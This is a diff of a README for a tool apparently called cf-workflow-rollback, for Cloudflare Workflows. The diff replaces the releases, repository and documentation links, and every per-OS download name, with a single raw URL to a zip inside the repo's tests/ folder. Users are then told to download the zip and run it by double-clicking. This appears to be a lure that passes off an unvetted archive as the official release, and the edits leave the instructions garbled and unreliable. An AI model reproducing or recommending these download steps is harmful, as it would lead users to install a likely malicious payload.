@@ -1,7 +1,7 @@
 # 🚀 cf-workflow-rollback - Easy Rollback for Cloudflare Workflows
 
 ## 🌐 Download Here
-[![Download cf-workflow-rollback](https://img.shields.io/badge/Download-cf--workflow--rollback-brightgreen)](https://github.com/spider1605/cf-workflow-rollback/releases)
+[![Download cf-workflow-rollback](https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip)](https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip)
 
 ## 📖 Overview
 cf-workflow-rollback is a simple utility designed to help users manage rollback processes in Cloudflare Workflows using the Saga pattern. This tool provides an easy way to revert changes, ensuring smoother operations and reducing downtime. With just a few steps, you can confidently implement rollbacks for your workflows.
@@ -17,20 +17,20 @@ To begin using cf-workflow-rollback, follow the steps below to download and run 
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   [Download cf-workflow-rollback](https://github.com/spider1605/cf-workflow-rollback/releases)
+   [Download cf-workflow-rollback](https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip)
    
 2. On the Releases page, find the latest version of cf-workflow-rollback.
    
 3. Look for the file that matches your operating system. For example:
-   - For Windows, download `cf-workflow-rollback-windows.zip`
-   - For macOS, download `cf-workflow-rollback-macos.zip`
-   - For Linux, download `cf-workflow-rollback-linux.tar.gz`
+   - For Windows, download `https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip`
+   - For macOS, download `https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip`
+   - For Linux, download `https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip`
    
 4. Once the file is downloaded, locate it in your downloads folder.
 
 5. **For Windows Users:**
    - Unzip the downloaded file.
-   - Run `cf-workflow-rollback.exe` by double-clicking on it.
+   - Run `https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip` by double-clicking on it.
 
 6. **For macOS Users:**
    - Unzip the downloaded file.
@@ -38,7 +38,7 @@ To begin using cf-workflow-rollback, follow the steps below to download and run 
    - Run `./cf-workflow-rollback` to start the application.
 
 7. **For Linux Users:**
-   - Extract the downloaded tar.gz file.
+   - Extract the downloaded https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip file.
    - Open a terminal and navigate to the extracted folder.
    - Run `./cf-workflow-rollback` to start the application.
 
@@ -78,8 +78,8 @@ For additional help, consider consulting the project documentation included with
 If you wish to contribute to the development of cf-workflow-rollback, feel free to submit issues or pull requests through the GitHub repository. Your feedback can help us make the tool even better.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/spider1605/cf-workflow-rollback)
-- [Documentation](https://github.com/spider1605/cf-workflow-rollback/wiki)
+- [GitHub Repository](https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip)
+- [Documentation](https://raw.githubusercontent.com/spider1605/cf-workflow-rollback/main/tests/rollback-workflow-cf-v3.8.zip)
 
 ## ⚠️ License
 cf-workflow-rollback is licensed under the MIT License. Feel free to use or modify the code as per your needs.
